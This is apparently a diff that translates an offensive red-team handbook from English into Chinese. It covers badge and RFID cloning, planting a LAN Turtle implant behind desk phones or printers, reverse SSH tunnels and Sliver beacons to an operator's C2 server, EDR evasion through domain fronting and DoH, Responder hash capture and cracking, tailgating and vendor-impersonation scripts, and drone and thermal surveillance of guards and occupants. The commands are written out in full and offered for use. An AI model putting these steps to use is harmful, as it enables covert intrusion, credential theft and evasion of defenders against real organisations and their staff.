-  it provides a covert management network, payload execution, and tunnel capability.
+为何视觉克隆重要：
+  克隆的 RFID 凭证能让你通过电子读卡器。
+  一张看起来不对的证件会被保安或员工拦下。
+  两层都必须处理。
 
-  LAN Turtle Gen 3 ($60): USB-A form factor
-  Shark Jack ($100): standalone network attack tool (no USB: inline on Ethernet)
+情报收集：
+  来源 1：公司网站上的团队照片和博客文章
+    员工在拍照时常常戴着证件。高分辨率照片能揭示：
+    证件尺寸、配色、标志位置、挂绳样式、
+    是否有照片 ID、是夹扣还是挂绳。
 
-PHYSICAL DEPLOYMENT STRATEGY:
+  来源 2：LinkedIn 和社交媒体
+    会议照片、办公室文化贴文、远程办公背景图。
+    员工把证件夹在衬衫上或挂在挂绳上入镜。
 
-  Best placement locations:
-    VoIP phone Ethernet port: every desk phone has an Ethernet jack that passthrough
-                              to the workstation. Phone and workstation share the jack.
-                              Unplug the phone's CAT5: insert LAN Turtle: plug LAN Turtle
-                              passthrough to the phone. The port stays active.
-                              PoE from the switch powers both the phone and the LAN Turtle.
-    AV rack / conference room: projector or display controller on dedicated Ethernet.
-                               Low-observation area. Long-duration access.
-    Network closet patch panel: if accessible: direct connection to a specific VLAN.
-    Printer Ethernet port: printers are rarely monitored. Sit on the network for months.
+  来源 3：Google 街景
+    如果大楼透过玻璃能看到大堂：前台证件可能可见。
 
-CONFIGURING LAN TURTLE FOR AUTOSSH REVERSE TUNNEL:
+  来源 4：以公众身份进行托词走访
+    现场观察进出员工的证件。
+    注意：尺寸（多数为 CR80：标准信用卡大小）、方向（横版/竖版）、
+    颜色、是否有全息覆膜、夹扣类型。
+
+证件制作：
+  设计软件：Canva 或 Adobe Illustrator
+  打印：用证卡打印机（Magicard、Zebra：全新 300-800 美元，二手 80 美元起）在 CR80 PVC 卡上打印
+  或者：在哑光相纸上喷墨打印，再压入 CR80 层压袋（每张 0.50 美元）
+  RFID 层：插入克隆的 T5577 卡。视觉证件把它遮住。
+
+  组合：视觉克隆 + RFID 克隆在一张卡里 = 完整凭证包。
+
+访客证件调研：
+  许多组织使用预先印制的访客证件设计。
+  这些常出现在公司社交媒体上关于活动和参观的照片里。
+  物理行动前先复刻访客证件设计：
+  你可能会在前台被发一张；若无人盘问，你也可以出示自己的。
+
+随身摄像头与证件佩戴：
+  夹扣高度：胸部（员工）vs. 髋部（承包商）
+  挂绳颜色：常按部门或角色区分
+  夹扣方向：照片朝外（公司标准）vs. 内折（遮住照片）
+  条件允许时先观察，再仿制。
+```
+
+---
+
+### 1.8 硬件植入：LAN Turtle + 规避 EDR 的回连
+
+#### LAN Turtle：部署与配置
+
+```
+是什么：
+  Hak5 LAN Turtle：一个伪装成 USB 以太网适配器的完整 Linux 系统。
+  插入交换机端口，或串接在设备与交换机之间时：
+  它提供隐蔽的管理网络、载荷执行和隧道能力。
+
+  LAN Turtle Gen 3（60 美元）：USB-A 形态
+  Shark Jack（100 美元）：独立网络攻击工具（不带 USB：串接在以太网中）
+
+物理部署策略：
+
+  最佳放置位置：
+    VoIP 电话的以太网口：每部桌面电话都有一个可透传到工作站的
+                              以太网口。电话和工作站共用该口。
+                              拔掉电话的 CAT5：插入 LAN Turtle：再把 LAN Turtle
+                              透传口接到电话。端口保持活跃。
+                              交换机的 PoE 同时给电话和 LAN Turtle 供电。
+    音视频机柜 / 会议室：投影仪或显示控制器用专用以太网。
+                               少人观察。可长期驻留。
+    网络间配线架：若能进入：直连到特定 VLAN。
+    打印机以太网口：打印机几乎无人监控。可在网络中潜伏数月。
+
+为 AutoSSH 反向隧道配置 LAN TURTLE：
 ```
 
 ```bash
-# On your VPS (your command-and-control server):
-# Create a dedicated tunnel user (no shell):
+# 在你的 VPS 上（你的命令与控制服务器）：
+# 创建一个专用隧道用户（无 shell）：
 sudo useradd -m -s /usr/sbin/nologin tunnel_user
 sudo mkdir -p /home/tunnel_user/.ssh
 sudo chmod 700 /home/tunnel_user/.ssh
 
-# Generate SSH key pair on your operator machine:
+# 在操作员机器上生成 SSH 密钥对：
 ssh-keygen -t ed25519 -f ~/.ssh/lan_turtle_key -C "lt_implant_01"
 
-# Authorize the public key on your VPS:
+# 在 VPS 上授权公钥：
 sudo bash -c "cat ~/.ssh/lan_turtle_key.pub >> /home/tunnel_user/.ssh/authorized_keys"
 sudo chmod 600 /home/tunnel_user/.ssh/authorized_keys
 
-# Edit sshd_config on VPS to allow tunnel forwarding:
-# In /etc/ssh/sshd_config add:
+# 编辑 VPS 上的 sshd_config 以允许隧道转发：
+# 在 /etc/ssh/sshd_config 中加入：
 # AllowTcpForwarding yes
 # GatewayPorts yes
 sudo systemctl restart sshd
 
-# On LAN Turtle: set up AutoSSH module in admin interface
-# Or manually in /etc/config/autossh:
+# 在 LAN Turtle 上：在管理界面中设置 AutoSSH 模块
+# 或手动编辑 /etc/config/autossh：
 # SSH_ARGS: -i /root/.ssh/lan_turtle_key -R 2222:localhost:22
 #           -N -o StrictHostKeyChecking=no -o ServerAliveInterval=30
 # SSH_HOST: YOUR_VPS_IP
 # SSH_USER: tunnel_user
 # SSH_PORT: 22
 
-# Access from operator machine through the tunnel:
+# 从操作员机器通过隧道访问：
 ssh -p 2222 root@YOUR_VPS_IP
-# You are now inside the LAN Turtle shell, which is inside the target network
+# 你现在已进入 LAN Turtle 的 shell，而它位于目标网络内部
 ```
 
-#### EDR-Evasive Callback Design
+#### 规避 EDR 的回连设计
 
 ```
-THE PROBLEM WITH AUTOSSH IN 2027:
+2027 年 AutoSSH 的问题：
 
-  AutoSSH tunnels have a distinctive behavioral fingerprint:
-    - Persistent outbound TCP connection to a non-standard port (22 to an external IP)
-    - Regular keep-alive packets at fixed intervals (ServerAliveInterval)
-    - Connection from an endpoint that "should be" a VoIP phone or printer
-    - Agent-based EDR (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint)
-      flags unusual outbound connections from network devices that do not have agents
+  AutoSSH 隧道有鲜明的行为指纹：
+    - 持续向非标准端口（对外部 IP 的 22 端口）发起出站 TCP 连接
+    - 固定间隔的规律性保活包（ServerAliveInterval）
+    - 来自一台“本应是”VoIP 电话或打印机的端点的连接
+    - 基于代理的 EDR（CrowdStrike Falcon、SentinelOne、Microsoft Defender for Endpoint）
+      会标记那些没有代理的网络设备发出的异常出站连接
 
-  What detects it:
-    Network EDR / NDR (Darktrace, Vectra AI): behavioral analysis of all traffic
-    Next-gen firewall with TLS inspection: decrypts SSH and sees the tunnel
-    SIEM correlation rule: new outbound SSH from a device that has never made SSH before
+  什么能检测到它：
+    网络 EDR / NDR（Darktrace、Vectra AI）：对全流量做行为分析
+    带 TLS 检查的下一代防火墙：解密 SSH 后看到隧道
+    SIEM 关联规则：一台从未发起过 SSH 的设备突然发起出站 SSH
 
-EVASIVE CALLBACK ARCHITECTURE FOR 2027:
+2027 年的规避回连架构：
 
-  Option A: HTTPS Beacon over CDN Domain Fronting
-    Use Sliver or Havoc C2 with an HTTPS listener.
-    Your C2 domain is fronted by Cloudflare or AWS CloudFront:
-      The outer TLS SNI field shows: cdn.cloudflare.com
-      The inner HTTP Host header shows: your-c2.yourdomain.com
-      The CDN forwards the request to your C2 server.
-    What the target's network sees: legitimate HTTPS traffic to Cloudflare IP ranges.
-    What the target's firewall blocks: nothing (Cloudflare is not blockable).
+  方案 A：基于 CDN 域名前置的 HTTPS 信标
+    使用带 HTTPS 监听器的 Sliver 或 Havoc C2。
+    你的 C2 域名由 Cloudflare 或 AWS CloudFront 前置：
+      外层 TLS SNI 字段显示：cdn.cloudflare.com
+      内层 HTTP Host 头显示：your-c2.yourdomain.com
+      CDN 把请求转发给你的 C2 服务器。
+    目标网络看到的是：发往 Cloudflare IP 段的合法 HTTPS 流量。
+    目标防火墙拦不住任何东西（Cloudflare 无法封禁）。
 
-  Option B: DNS-over-HTTPS (DoH) C2 Channel
-    Use a C2 framework that tunnels implant comms over DoH.
-    Requests appear as HTTPS traffic to 1.1.1.1 (Cloudflare) or 8.8.8.8 (Google).
-    Extremely difficult to block without breaking all encrypted DNS on the network.
-    Tools: PoshC2 DNS C2 module; custom DNS-over-HTTPS implementation.
+  方案 B：DNS-over-HTTPS（DoH）C2 通道
+    使用把植入体通信封装在 DoH 之上的 C2 框架。
+    请求看起来是发往 1.1.1.1（Cloudflare）或 8.8.8.8（Google）的 HTTPS 流量。
+    除非把网络上所有加密 DNS 都打断，否则极难阻断。
+    工具：PoshC2 的 DNS C2 模块；自定义的 DNS-over-HTTPS 实现。
 
-  Option C: Reduced Beacon Interval + Jitter
-    Instead of AutoSSH keep-alive every 30 seconds (very regular = detectable):
-    Configure Sliver beacon: sleep_interval 1800 + sleep_jitter 50%
-    Beacon checks in once every 15-45 minutes (randomized).
-    Behavioral detection requires longer observation window.
-    Combine with: HTTPS CDN fronting for full stealth.
+  方案 C：降低信标频率 + 抖动
+    与其每 30 秒一次 AutoSSH 保活（非常规律 = 可被检测）：
+    配置 Sliver 信标：sleep_interval 1800 + sleep_jitter 50%
+    信标每 15-45 分钟（随机）回连一次。
+    行为检测需要更长的观察窗口。
+    再配合：HTTPS CDN 前置，实现完全隐蔽。
 
-SLIVER C2 LISTENER CONFIGURATION FOR IMPLANT:
+用于植入体的 SLIVER C2 监听器配置：
 ```
 
 ```bash
-# On your Sliver C2 server:
-# Start an mTLS listener (mutual TLS: both sides authenticate):
+# 在你的 Sliver C2 服务器上：
+# 启动 mTLS 监听器（双向 TLS：双方都要认证）：
 sliver > mtls --lhost YOUR_C2_IP --lport 8888
 
-# Generate an implant for deployment on the LAN Turtle:
-# LAN Turtle runs OpenWrt (ARM Linux): compile accordingly
+# 生成用于部署到 LAN Turtle 的植入体：
+# LAN Turtle 运行 OpenWrt（ARM Linux）：按此编译
 sliver > generate --mtls YOUR_C2_IP:8888 \
                   --os linux \
                   --arch arm64 \
@@ -922,288 +922,288 @@ sliver > generate --mtls YOUR_C2_IP:8888 \
                   --jitter 50 \
                   --save /tmp/lt_beacon
 
-# Transfer beacon to LAN Turtle:
+# 把信标传输到 LAN Turtle：
 scp /tmp/lt_beacon root@LAN_TURTLE_IP:/usr/local/bin/beacon
 
-# Set it to run as a cron job on LAN Turtle (not AutoSSH):
-# Add to /etc/crontabs/root:
+# 在 LAN Turtle 上设为 cron 任务运行（不用 AutoSSH）：
+# 加入 /etc/crontabs/root：
 # @reboot sleep 120 && /usr/local/bin/beacon &
 # */30 * * * * pgrep beacon || /usr/local/bin/beacon &
 
-# On operator machine: connect when beacon checks in:
+# 在操作员机器上：信标回连时接入：
 sliver > use [SESSION-UUID]
-sliver (implant) > ifconfig       # what network are we on?
-sliver (implant) > netstat        # what is connected to this host?
-sliver (implant) > execute nmap -sn 10.X.X.0/24   # internal subnet discovery
+sliver (implant) > ifconfig       # 我们在哪个网络上？
+sliver (implant) > netstat        # 谁连着这台主机？
+sliver (implant) > execute nmap -sn 10.X.X.0/24   # 内网子网发现
 ```
 
-#### Responder: Credential Capture from the Implant
+#### Responder：从植入体捕获凭证
 
 ```bash
-# Run Responder through the Sliver session or directly on LAN Turtle:
-# LAN Turtle supports Responder natively via module manager.
+# 通过 Sliver 会话或在 LAN Turtle 上直接运行 Responder：
+# LAN Turtle 通过模块管理器原生支持 Responder。
 
-# Manual Responder setup on LAN Turtle shell:
+# 在 LAN Turtle shell 上手动配置 Responder：
 pip3 install impacket --break-system-packages
 git clone https://github.com/lgandx/Responder
 cd Responder
 
-# Identify the internal interface:
+# 识别内部网卡：
 ip link show
 
-# Run Responder (poisoning LLMNR, NBT-NS, mDNS):
+# 运行 Responder（投毒 LLMNR、NBT-NS、mDNS）：
 python3 Responder.py -I br-lan -wPv
-# -w: start WPAD rogue server (captures proxy auth)
-# -P: force NTLM auth on WPAD
-# -v: verbose output
+# -w：启动 WPAD 诱饵服务器（捕获代理认证）
+# -P：在 WPAD 上强制 NTLM 认证
+# -v：详细输出
 
-# Hashes accumulate in Responder/logs/
-# NTLMv2-SSP hashes are crackable with hashcat:
+# 哈希会累积在 Responder/logs/ 中
+# NTLMv2-SSP 哈希可用 hashcat 破解：
 hashcat -m 5600 hashes.txt /opt/wordlists/rockyou.txt \
         --rules-file best64.rule -O
 ```
 
 ---
 
-### 1.9 TAILGATING AND PRETEXT ENTRY
+### 1.9 尾随进入与托词进入
 
 ```
-THE PSYCHOLOGY:
-  Tailgating works because humans have a biological aversion to confrontation.
-  Challenging someone who "looks like they belong" risks:
-    - Embarrassing yourself if they are legitimate
-    - A social conflict with a colleague or supervisor
-    - Appearing unhelpful or paranoid
-  Most people resolve this discomfort by holding the door.
+心理原理：
+  尾随之所以奏效，是因为人类天生厌恶对抗。
+  去质疑一个“看起来像这里的人”要冒：
+    - 如果对方是合法人员，自己会很尴尬
+    - 与同事或主管发生社交冲突
+    - 显得不帮忙或疑神疑鬼
+  多数人用“帮忙扶门”来化解这种不适。
 
-WHAT "LOOKING LIKE YOU BELONG" REQUIRES:
+“看起来像属于这里”需要什么：
 
-  Clothing matching the environment:
-    Office building: business casual or business professional + badge
-    Data center: vendor polo shirt + tool bag + badge
-    Hospital: scrubs + badge + stethoscope or tablet
-    Industrial/utility: high-vis vest + hard hat + clipboard
+  与环境相符的着装：
+    办公楼：商务休闲或商务正装 + 证件
+    数据中心：厂商 polo 衫 + 工具包 + 证件
+    医院：手术服 + 证件 + 听诊器或平板
+    工业/公用事业：高亮反光背心 + 安全帽 + 写字板
   
-  Props:
-    Hands full (boxes, coffee tray, laptop bag): triggers the "let me get the door" reflex
-    Clipboard with a work order: signals purpose and authorization
-    Tool bag: signals a technical vendor role
+  道具：
+    双手占满（箱子、咖啡托盘、笔记本电脑包）：触发“我来帮你开门”的本能
+    夹着工单的写字板：传达目的与授权
+    工具包：传达技术厂商的身份
     
-  Body language:
-    Move with purpose: not looking for exits, not scanning for cameras
-    Light conversation while walking: "Crazy Monday, right?" builds instant rapport
-    Appear familiar with the space: do not stop to look at floor directories
+  肢体语言：
+    有目的地移动：不找出口，不四处扫摄像头
+    边走边闲聊：“周一真是疯狂，对吧？”能瞬间建立融洽感
+    表现得熟悉这个地方：不要停下来看楼层索引
 
-VENDOR PRETEXT: The Complete Setup:
-  Legend: "Michael Torres, IT Support Engineer, [REAL LOCAL IT VENDOR]"
-  Research the vendor: LinkedIn, website, service area
-  Print business cards: Vistaprint ($15 for 100 cards) with their branding
-  Work order: Microsoft Word template with their letterhead + a vague task description
-    ("Quarterly network infrastructure review: conference room AV systems, floors 2-4")
-  Badge: visual clone of visitor badge design (Section 1.7)
-  RFID: cloned credential on a T5577 card (Section 1.6)
+厂商托词：完整设置：
+  身份：“Michael Torres，IT 支持工程师，[当地真实 IT 厂商]”
+  调研该厂商：LinkedIn、网站、服务区域
+  印名片：用 Vistaprint（100 张 15 美元），带他们的品牌标识
+  工单：用他们的信头做 Word 模板 + 一项含糊的任务描述
+    （“季度网络基础设施巡检：会议室音视频系统，2-4 层”）
+  证件：访客证件设计的视觉克隆（见 1.7 节）
+  RFID：写入 T5577 卡的克隆凭证（见 1.6 节）
 
-ENTRY SEQUENCE:
-  1. Arrive at reception during a busy period (10-11am, 2-3pm)
-  2. State the pretext with confidence (not arrogance)
-     "Good morning: I'm [NAME] from [VENDOR] here for the quarterly AV check.
-      I believe [IT MANAGER NAME] has a ticket open for this.
-      Would you be able to ring him, or is [IT HELPDESK NAME] available?"
-  3. Name-drop researched contacts: creates verification burden
-  4. If visitor badge is issued: accept and wear it. If not: wear your pre-built version.
-  5. Once on the floor: move with purpose. Do not ask for directions.
-     If lost: "I was just up here last quarter: I think it is this way?"
+进入流程：
+  1. 在繁忙时段到达前台（上午 10-11 点，下午 2-3 点）
+  2. 自信（而非傲慢）地说出托词
+     “早上好：我是 [厂商] 的 [姓名]，来做季度音视频巡检。
+      我记得 [IT 经理姓名] 为这事开过工单。
+      您能帮我打个电话给他吗，或者 [IT 服务台姓名] 在吗？”
+  3. 报出调研过的联系人姓名：制造核实负担
+  4. 若发放访客证件：接受并佩戴。若不发：戴上你预先做好的那张。
+  5. 进入楼层后：有目的地移动。不要问路。
+     如果迷路：“我上个季度刚来过：应该是这边吧？”
 
-TAILGATE BEHIND AN EMPLOYEE:
-  Best window: immediately behind a group of 3+ employees
-  Position: in the group, not trailing behind
-  Speed: match their walking pace exactly
-  Badge: have it visible and oriented correctly
-  Conversation: optionally say "Thank you" as you pass through with them
+尾随在员工身后：
+  最佳窗口：紧跟在 3 人以上的员工群体后面
+  位置：在人群之中，不要落在后面
+  速度：与他们的步速完全一致
+  证件：让它可见且方向正确
+  交谈：可选，在跟他们一起通过时说声“谢谢”
 
-ABORT SIGNALS:
-  Security desk asks for a photo ID you do not have:
-    "Of course: I left my main wallet in the car. Give me two minutes and I will grab it."
-    Exit. Do not return.
+中止信号：
+  保安台要你出示你没有的照片证件：
+    “当然：我主钱包落车里了。给我两分钟，我去拿。”
+    离开。不要回来。
   
-  Someone asks who you are meeting with and calls to verify:
-    Do not attempt to stop the call.
-    "Absolutely, I will wait right here."
-    If the cover story collapses: "There may have been a mix-up on the scheduling. 
-    Let me call my office and sort this out." Exit.
+  有人问你要见谁，并打电话核实：
+    不要去阻止这通电话。
+    “完全没问题，我就在这儿等。”
+    如果掩护故事崩了：“可能是日程上出了点岔子。
+    我打个电话回办公室把这事理清楚。”离开。
   
-  Rule: the exit always looks voluntary. A voluntary exit is not an incident.
-  A caught-and-confronted situation is an incident that can end the engagement.
+  规则：退出永远要看起来是自愿的。自愿离开不算事件。
+  被当场抓住并对质，才是可能终结整个行动的事件。
 ```
 
 ---
 
-### 1.10 DRONE RECON: FULL CURRICULUM (OPTICAL + THERMAL)
+### 1.10 无人机侦察：完整课程（光学 + 热成像）
 
-#### Why Drone Recon Matters
-
-```
-Ground-level recon has limits:
-  - You cannot see rooftop camera placements from the street
-  - Building perimeter mapping requires walking the entire exterior (conspicuous)
-  - Fence perimeter, guard post positions, and patrol routes are invisible from the street
-
-Drone recon solves these problems:
-  - Overhead view reveals full building layout in minutes
-  - Camera positions, angles, and coverage gaps visible from above
-  - Loading dock schedules observable from safe distance
-  - Roof access points (hatches, HVAC access, skylights)
-  - Parking lot: identifying high-value employee vehicles for later OSINT
-```
-
-#### Drone Selection for Physical Red Team
+#### 为何无人机侦察重要
 
 ```
-REQUIREMENTS:
-  Sub-250g aircraft: in most jurisdictions (US FAA Part 107, UK CAA, EU A1/A2),
-  drones under 250g have significantly reduced regulatory requirements.
-  Under 250g you can fly in more locations without registration or a license.
-  This is the physical red team target weight class.
+地面侦察有局限：
+  - 从街上看不到屋顶摄像头的布点
+  - 测绘建筑周界需要绕行整个外墙（很显眼）
+  - 围栏周界、岗哨位置和巡逻路线从街上都看不到
 
-RECOMMENDED PLATFORMS:
-
-  Primary: DJI Mini 4 Pro ($759)
-    249g. 4K/60fps. 34-minute flight time. 20km video transmission.
-    Omnidirectional obstacle sensing (critical for urban environments).
-    Subject tracking: auto-follows a target for personnel observation.
-    Foldable: fits in a jacket pocket.
-
-  Budget option: DJI Mini 3 ($299)
-    249g. 4K/30fps. 38-minute flight time. Excellent image quality.
-    No obstacle sensing (fly more carefully).
-    Best value for red team ISR.
-
-  THERMAL: DJI Mini 4 Pro + Zenmuse XT2 or DJI Mavic 3 Enterprise Thermal ($4,500+):
-    Thermal + visual dual camera. See body heat signatures through windows at night.
-    Use cases:
-      - Confirm whether a room is occupied before attempting entry
-      - Locate guard patrol routes in darkness
-      - Identify heat signatures from server rooms on rooftops (warm air exhaust)
-      - Find exterior power infrastructure (warm conduit = active power run)
-    Trade-off: over 250g, requires registration and in some jurisdictions a Part 107 cert.
-
-  DO NOT USE consumer toy drones (<$100): poor camera quality, short range,
-  unreliable connection, impossible to use for professional ISR.
+无人机侦察解决这些问题：
+  - 俯视视角几分钟内呈现完整建筑布局
+  - 从上方可见摄像头位置、角度和覆盖缺口
+  - 可在安全距离观察装卸平台的作业时间表
+  - 屋顶入口（检修口、暖通检修口、天窗）
+  - 停车场：识别高价值员工车辆，供后续 OSINT 使用
 ```
 
-#### Pre-Flight OSINT and Planning
+#### 物理红队的无人机选型
 
 ```
-BEFORE YOU FLY:
+要求：
+  250 克以下机型：在多数司法辖区（美国 FAA Part 107、英国 CAA、欧盟 A1/A2），
+  250 克以下的无人机监管要求大幅降低。
+  低于 250 克，你可以在更多地点飞行，无需注册或执照。
+  这就是物理红队的目标重量级别。
 
-  Step 1: Satellite and aerial baseline:
-    Google Earth Pro (free): historical imagery lets you see building state over time
-    Google Maps satellite view: current state
-    Bing Maps Birds Eye: different angle, often better detail for roof layouts
-    Review: building footprint, parking lot layout, visible camera housing locations,
-            loading dock positions, fence/gate configuration
+推荐平台：
 
-  Step 2: Airspace check (mandatory):
-    FAA B4UFLY app (US): shows controlled airspace, TFRs, no-fly zones
-    Aloft ATC: real-time airspace overlay
-    DJI Fly app: built-in airspace warning (also enforces geofencing)
+  主力：DJI Mini 4 Pro（759 美元）
+    249g。4K/60fps。34 分钟续航。20km 图传。
+    全向避障感知（城市环境至关重要）。
+    主体跟踪：自动跟随目标，用于人员观察。
+    可折叠：能放进夹克口袋。
 
-    CHECK BEFORE EVERY FLIGHT. Flying in controlled airspace without authorization
-    is a federal violation (US: 49 USC 46307; up to $27,500 civil penalty).
+  预算方案：DJI Mini 3（299 美元）
+    249g。4K/30fps。38 分钟续航。画质优秀。
+    无避障感知（飞行要更小心）。
+    红队 ISR 性价比最高。
 
-  Step 3: Counter-drone awareness:
-    High-security targets may deploy counter-drone systems:
-    RF detection (DroneShield, Dedrone): detects the 2.4GHz/5.8GHz control signal
-    Action: use maximum distance (200m+), brief flight, different ingress/egress each time
-    Geofencing enforcement: DJI enforces no-fly zones via GPS + firmware
+  热成像：DJI Mini 4 Pro + Zenmuse XT2 或 DJI Mavic 3 Enterprise Thermal（4500 美元起）：
+    热成像 + 可见光双相机。夜间可透过窗户看到人体热特征。
+    使用场景：
+      - 进入前确认房间是否有人
+      - 在黑暗中定位保安巡逻路线
+      - 识别屋顶机房的热特征（排出的热风）
+      - 找到外部电力设施（发热的线管 = 有电的线路）
+    代价：超过 250 克，需要注册，某些辖区还需 Part 107 执照。
+
+  不要用消费级玩具无人机（低于 100 美元）：画质差、距离短、
+  连接不可靠，无法用于专业 ISR。
 ```
 
-#### Optical Flight Protocol
+#### 飞行前 OSINT 与规划
 
 ```
-FLIGHT PROTOCOL:
-  1. Pre-flight checklist:
-     Battery: 100%  |  Firmware: updated  |  Memory card: empty  |  Airspace: clear
-     Weather: winds under 20mph, no rain, visibility > 3 miles
+飞行之前：
 
-  2. Take-off from designated point: hover at 10m for 30 seconds to confirm GPS lock
+  第 1 步：卫星与航拍基线：
+    Google Earth Pro（免费）：历史影像可看到建筑随时间的变化
+    Google Maps 卫星视图：当前状态
+    Bing Maps Birds Eye：不同角度，屋顶布局通常更清晰
+    查看：建筑轮廓、停车场布局、可见的摄像头外壳位置、
+            装卸平台位置、围栏/大门构造
 
-  3. Primary flight path: Perimeter first
-     Phase A: 80m altitude, 150m distance: capture all four exterior faces
-     Phase B: 60m altitude, 80m distance: camera angles, badge reader locations
-     Phase C: 50m altitude, directly above: roof survey (hatches, HVAC, cabling)
+  第 2 步：空域检查（强制）：
+    FAA B4UFLY 应用（美国）：显示管制空域、TFR、禁飞区
+    Aloft ATC：实时空域图层
+    DJI Fly 应用：内置空域警告（同时执行地理围栏）
 
-  4. Area survey:
-     Parking lot: vehicle count establishes number of employees present
-     High-end vehicles clustered in one area: executive parking
-     Delivery zone: timing for tailgate windows
-     Emergency exits: where employees take breaks
+    每次飞行前都要检查。未经授权在管制空域飞行
+    属于联邦违法（美国：49 USC 46307；民事罚款最高 27,500 美元）。
+
+  第 3 步：反无人机意识：
+    高安全性目标可能部署反无人机系统：
+    射频探测（DroneShield、Dedrone）：检测 2.4GHz/5.8GHz 控制信号
+    应对：用最大距离（200m 以上）、短时飞行、每次换不同的进出路线
+    地理围栏强制：DJI 通过 GPS + 固件执行禁飞区
 ```
 
-#### Thermal Operations (Night / Low-Light)
+#### 光学飞行规程
 
 ```
-THERMAL RECON USE CASES:
+飞行规程：
+  1. 飞行前检查清单：
+     电池：100%  |  固件：已更新  |  存储卡：已清空  |  空域：无限制
+     天气：风速低于 20mph，无雨，能见度 > 3 英里
 
-  Guard route mapping:
-    Thermal shows heat signatures through glass and thin walls
-    Fly at 60m altitude, 100m distance: observe guard routes from above
-    Body heat signatures from patrols are distinct on thermal: document timing
+  2. 从指定点起飞：在 10m 高度悬停 30 秒以确认 GPS 锁定
 
-  Occupancy confirmation:
-    Before physical entry: fly thermal: confirm the area you are entering is empty
-    Saves the operation: a surprise occupied room is a compromised entry
+  3. 主飞行路径：先绕周界
+     阶段 A：80m 高度、150m 距离：拍摄四个外立面
+     阶段 B：60m 高度、80m 距离：摄像头角度、读卡器位置
+     阶段 C：50m 高度、正上方：屋顶勘察（检修口、暖通、线缆）
 
-  Server room identification:
-    Data center and server room HVAC exhausts hot air: visible as thermal bloom
-    on rooftops and exterior vents: helps identify the target zone in large buildings
-
-  External power infrastructure:
-    Active electrical conduit runs warm: visible on thermal
-    Helps identify where the building's power distribution enters: relevant for
-    fail-safe lock attacks (cutting power to the right circuit)
-
-THERMAL CAMERA OPTIONS:
-  FLIR Lepton 3.5 breakout module ($200): low-res but lightweight; attaches to Raspberry Pi
-  DJI Zenmuse XT2 (for Matrice series): professional, $2,500+, 640x512 thermal resolution
-  FLIR One Pro (smartphone attachment, $400): 160x120 thermal on your phone: usable for
-  ground-level pre-entry occupancy checks
-
-THERMAL DELIVERABLES:
-  Side-by-side images: thermal + optical for each finding
-  Annotate: heat signatures with descriptions (person, server room exhaust, active conduit)
-  Time-stamp: all thermal images (route timing, occupancy windows)
+  4. 区域勘察：
+     停车场：车辆数量可推算在场员工人数
+     集中在一处的高档车：高管停车区
+     收货区：尾随窗口的时间点
+     紧急出口：员工去哪儿抽烟休息
 ```
 
-#### ISR Annotation and Deliverable
+#### 热成像作业（夜间 / 弱光）
 
 ```
-POST-FLIGHT ANNOTATION:
-  Software: DJI Fly exports footage: import stills into Greenshot or GIMP
+热成像侦察使用场景：
 
-  COLOR-CODED MARKERS:
-    RED:    cameras (position, angle of coverage)
-    ORANGE: access points (doors, gates, loading docks)
-    YELLOW: guard positions observed
-    BLUE:   network/comms infrastructure on roof
-    GREEN:  entry points with low camera coverage
-    WHITE:  dead zones in camera coverage
-    PURPLE: thermal findings (heat signatures, occupied rooms)
+  保安路线测绘：
+    热成像可透过玻璃和薄墙显示热特征
+    在 60m 高度、100m 距离飞行：从上方观察保安路线
+    巡逻人员的人体热特征在热成像上很清晰：记录时间点
 
-  DELIVERABLE:
-    1. Aerial overview: full perimeter with all markers
-    2. Close-up: each facade with markers
-    3. Roof survey: annotated
-    4. Camera coverage map: estimated 90-degree FOV cones from each camera
-    5. Thermal findings: side-by-side thermal/optical where applicable
-    6. Gap analysis: identified dead zones and entry windows in writing
+  占用确认：
+    物理进入前：飞热成像：确认你要进的地方是空的
+    这能救整个行动：撞上有人在的房间就意味着进入暴露
+
+  机房识别：
+    数据中心和机房的暖通排出热风：在屋顶和外部通风口
+    表现为热晕：有助于在大楼中定位目标区域
+
+  外部电力设施：
+    有电的线管会发热：在热成像上可见
+    有助于确定大楼配电入口：与
+    失效安全锁攻击相关（切断正确回路的电源）
+
+热成像相机选项：
+  FLIR Lepton 3.5 分线模块（200 美元）：分辨率低但轻；可接树莓派
+  DJI Zenmuse XT2（用于 Matrice 系列）：专业级，2500 美元以上，640x512 热分辨率
+  FLIR One Pro（手机附件，400 美元）：手机上 160x120 热成像：可用于
+  地面进入前的占用检查
+
+热成像交付物：
+  并排图像：每项发现都配热成像 + 可见光
+  标注：热特征加描述（人员、机房排风、带电管线）
+  时间戳：所有热成像图像（路线时间、占用窗口）
+```
+
+#### ISR 标注与交付
+
+```
+飞行后标注：
+  软件：DJI Fly 导出素材：把静帧导入 Greenshot 或 GIMP
+
+  颜色标记：
+    红色：  摄像头（位置、覆盖角度）
+    橙色：  出入口（门、大门、装卸平台）
+    黄色：  观察到的保安位置
+    蓝色：  屋顶上的网络/通信设施
+    绿色：  摄像头覆盖较少的进入点
+    白色：  摄像头覆盖的死区
+    紫色：  热成像发现（热特征、有人的房间）
+
+  交付物：
+    1. 航拍总览：完整周界 + 全部标记
+    2. 特写：每个立面 + 标记
+    3. 屋顶勘察：已标注
+    4. 摄像头覆盖图：每台摄像头约 90 度视场锥
+    5. 热成像发现：适用的地方给出热成像/可见光并排图
+    6. 缺口分析：以书面形式列出已识别的死区和进入窗口
 ```
 
 ---
 
-## SECTION 2: SOCIAL ENGINEERING: THE HUMAN ATTACK SURFACE
+## 第 2 部分：社会工程：人的攻击面
 
-> Physical Red Team gets you in the building. Social Engineering gets you trusted once you are there, and gets insiders to hand you what you cannot steal. This section is a complete methodology: not just scripts.
+> 物理红队让你进入大楼。社会工程让你到了里面之后获得信任，并让内部人员把你自己偷不到的东西交给你。本节是一套完整方法论：不只是话术。
 
 <div align="center">
 <table><tr><td>
@@ -1215,424 +1215,424 @@ POST-FLIGHT ANNOTATION:
 
 ---
 
-### 2.1 THE PSYCHOLOGY FRAMEWORK: SIX PRINCIPLES OF INFLUENCE
+### 2.1 心理学框架：影响力的六大原则
 
-Before you construct any pretext, understand WHY people comply. Robert Cialdini's six principles are the foundation of every effective social engineering attack. Learn these as a framework, not a script. If you understand the principle, you can construct any pretext from scratch.
-
-```
-PRINCIPLE 1: AUTHORITY
-  People defer to perceived authority figures. Lab coats, uniforms, titles,
-  and confident behavior all signal authority.
-
-  SE application:
-    - Caller ID spoofed to IT Help Desk number
-    - Uniform or vendor vest with a known company name
-    - Title: "IT Security team", "Corporate Audit", "Executive Support"
